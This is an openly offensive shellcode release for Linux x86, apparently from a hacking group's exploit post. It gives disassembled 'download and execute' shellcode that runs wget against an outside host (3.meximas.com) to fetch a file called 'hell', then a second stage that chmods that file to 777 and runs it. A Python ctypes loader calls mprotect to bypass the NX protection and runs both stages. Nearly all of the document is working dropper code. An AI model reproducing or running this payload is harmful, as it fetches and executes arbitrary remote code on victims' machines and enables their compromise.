Linux/x86  Download&Execute


------WE ARE BOMBERMANS----
#Greetz : Bomberman(Leader)
#Author : B3mB4m
#Just the two of us LOL.


Info!
	This shellcode has two part.Because when using fork in asm, ocurrs problems in shellcode.
	So you can use multiprocessing to do this.
	If you dont want problem while running shellcodes.
	I did not calculate len bytes.Because its completely depend url length.

	TESTED ON : Ubuntu 14.04


/*
The NX Bit prevents random data being executed on modern processors and OSs.
To get around it, call mprotect.
You should also define your shellcode as a binary instead of a character string.

-By Philipp Hagemeister

Emmy goes to  Philipp Hagemeister ! ! (clap clap clap clap)
Special thanks :)  ..
*/

;https://github.com/b3mb4m/Shellcode/blob/master/Auxiliary/convertstack.py
;Use it convert string to stack.


#Remote file download#

08048060 <.text>:
 8048060:	31 c0                	xor    %eax,%eax
 8048062:	50                   	push   %eax
 8048063:	68 68 65 6c 6c       	push   $0x6c6c6568
 8048068:	68 62 34 6d 2f       	push   $0x2f6d3462
 804806d:	68 2f 62 33 6d       	push   $0x6d33622f
 8048072:	68 6d 2f 2f 2f       	push   $0x2f2f2f6d
 8048077:	68 73 2e 63 6f       	push   $0x6f632e73
 804807c:	68 78 69 6d 61       	push   $0x616d6978
 8048081:	68 33 2e 6d 65       	push   $0x656d2e33 ;3.meximas.com/b3mb4m/hell
 8048086:	89 e1                	mov    %esp,%ecx
 8048088:	50                   	push   %eax
 8048089:	68 77 67 65 74       	push   $0x74656777
 804808e:	68 62 69 6e 2f       	push   $0x2f6e6962
 8048093:	68 75 73 72 2f       	push   $0x2f727375
 8048098:	68 2f 2f 2f 2f       	push   $0x2f2f2f2f
 804809d:	89 e3                	mov    %esp,%ebx
 804809f:	50                   	push   %eax
 80480a0:	50                   	push   %eax
 80480a1:	51                   	push   %ecx
 80480a2:	53                   	push   %ebx
 80480a3:	89 e1                	mov    %esp,%ecx
 80480a5:	b0 0b                	mov    $0xb,%al
 80480a7:	cd 80                	int    $0x80
 80480a9:	31 c0                	xor    %eax,%eax
 80480ab:	fe c0                	inc    %al
 80480ad:	cd 80                	int    $0x80


#Download&Chmod777&Execute

08048060 <.text>:
 8048060:	31 c0                	xor    %eax,%eax
 8048062:	31 c9                	xor    %ecx,%ecx
 8048064:	50                   	push   %eax
 8048065:	68 68 65 6c 6c       	push   $0x6c6c6568 ;file name(hell)
 804806a:	b0 0f                	mov    $0xf,%al
 804806c:	89 e3                	mov    %esp,%ebx
 804806e:	66 b9 ff 01          	mov    $0x1ff,%cx
 8048072:	cd 80                	int    $0x80
 8048074:	31 c0                	xor    %eax,%eax
 8048076:	50                   	push   %eax
 8048077:	89 e2                	mov    %esp,%edx
 8048079:	53                   	push   %ebx
 804807a:	89 e1                	mov    %esp,%ecx
 804807c:	b0 0b                	mov    $0xb,%al
 804807e:	cd 80                	int    $0x80



Than lets back python.


#!/usr/bin/python

import ctypes
import multiprocessing
import time


def download(firstone="Capture"):
	if firstone != "Capture":
		#Download codes.
		shellcode_data = (b"\x31\xc0\x50\x68\x68\x65\x6c\x6c\x68\x62\x34\x6d\x2f\x68\x2f\x62"
			b"\x33\x6d\x68\x6d\x2f\x2f\x2f\x68\x73\x2e\x63\x6f\x68\x78\x69\x6d\x61\x68\x33\x2e"
			b"\x6d\x65\x89\xe1\x50\x68\x77\x67\x65\x74\x68\x62\x69\x6e\x2f\x68\x75\x73\x72\x2f"
			b"\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xfe"
			b"\xc0\xcd\x80")
	else:
		time.sleep(30)#Time delay, depend ur file size.
		shellcode_data = (b"\x31\xc0\x50\x68\x68\x65\x6c\x6c\xb0\x0f\x89\xe3\x66\xb9\xff\x01"
			b"\xcd\x80\x31\xc0\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
		#Chomd777 and execute it.
	shellcode = ctypes.c_char_p(shellcode_data)
	function = ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))

	addr = ctypes.cast(function, ctypes.c_void_p).value
	libc = ctypes.CDLL('libc.so.6')
	pagesize = libc.getpagesize()
	addr_page = (addr // pagesize) * pagesize
	for page_start in range(addr_page, addr + len(shellcode_data), pagesize):
	    assert libc.mprotect(page_start, pagesize, 0x7) == 0
	function()


for x in xrange(0, 2):
	if x == 0:
		first = multiprocessing.Process(target=download, args=("KnockKnock",))
	else:
		first = multiprocessing.Process(target=download)
	first.start()


#Bomberman Team presented !!